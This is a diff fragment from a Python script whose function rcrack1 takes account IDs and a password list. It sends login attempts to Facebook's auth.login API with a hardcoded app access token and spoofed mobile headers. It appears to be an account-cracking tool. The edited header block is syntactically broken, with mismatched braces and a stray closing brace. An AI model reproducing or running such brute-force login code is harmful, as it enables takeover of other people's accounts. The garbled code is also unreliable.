@@ -802,7 +802,7 @@ def rcrack1(ids,passlist):
 			'fb_api_req_friendly_name':'authenticate',
 			'fb_api_caller_class':'com.facebook.account.login.protocol.Fb4aAuthHandler',
 			'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
-			head = 'Mozilla/5.0 (Linux; Android 13; SM-A037M Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) VenusBrowser/3.2.33 Chrome/113.0.5672.163 Mobile Safari/537.36',}
+			head = 'Mozilla/5.0 (Linux; Android 13; SM-A037M Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) VenusBrowser/3.2.33 Chrome/113.0.5672.163 Mobile Safari/537.36',
 		    "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": 'Mozilla/5.0 (Linux; Android 9; SM-M107F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.125 Mobile Safari/537.36',} "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
 			url = 'https://b-api.facebook.com/method/auth.login'
 			po = requests.post(url,data=data,headers=head,allow_redirects=False).text
